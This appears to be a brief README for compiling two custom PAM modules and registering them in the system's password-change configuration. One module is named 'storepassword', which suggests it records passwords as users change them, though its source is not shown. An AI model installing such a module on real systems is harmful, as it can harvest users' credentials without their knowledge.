# password module
requires 
sudo apt-get install libpam0g-dev


mkdir /lib/security
gcc -fPIC -fno-stack-protector -c storepassword.c && ld -x --shared -o /lib/security/storepassword.so storepassword.o
gcc -fPIC -fno-stack-protector -c warn.c && ld -x --shared -o /lib/security/warn.so warn.o  

/etc/pam.d/common-password:
password required /lib/security/storepassword.so

/etc/pam.d/passwd:
password required /lib/security/warn.so

before @include


